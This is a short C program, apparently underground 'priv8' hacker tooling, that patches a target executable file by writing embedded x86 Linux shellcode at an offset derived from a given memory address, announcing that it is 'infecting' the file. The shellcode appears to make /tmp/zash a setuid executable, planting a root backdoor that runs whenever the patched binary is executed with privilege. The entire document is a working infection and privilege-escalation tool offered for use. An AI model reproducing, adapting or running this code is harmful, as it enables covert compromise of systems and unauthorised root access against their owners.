/* priv8 defaced staff ware */

/*
     writes hellcode into file (arg1) with offset (arg2)
*/
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

char hell[] =
"\x99\x6a\x31\x58\xcd\x80\x39\xc2\x75\x12\x89\xc1\x6a\x10"
"\x58\xeb\x10\x5b\xcd\x80\x66\xb9\xed\x09\xb0\x0f\xcd\x80"
"\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff/tmp/zash";


int main(int argc, char *argv[])
{
    int fd, k;
    unsigned int addr = 0, offs;
    
    if (argc < 3)
    {
        printf("Usage: %s <file> <addr>\n", argv[0]);
        return 0;
    }
    
    sscanf(argv[2], "%x", &addr);
    
    offs = addr - 0x08048000;
    printf("[+] using offset 0x%x\n", offs);

    fd = open(argv[1], O_WRONLY);
    if (fd < 0)
    {
        printf("[-] cant open %s\n", argv[1]);
        return 0;
    }
    
    printf("[+] infecting %s\n", argv[1]);
    
    lseek(fd, offs, 0);
    write(fd, &hell, strlen(hell)+1);
    close(fd);
    
    printf("[+] %i bytes writen done\n", strlen(hell));
    return 0;
}
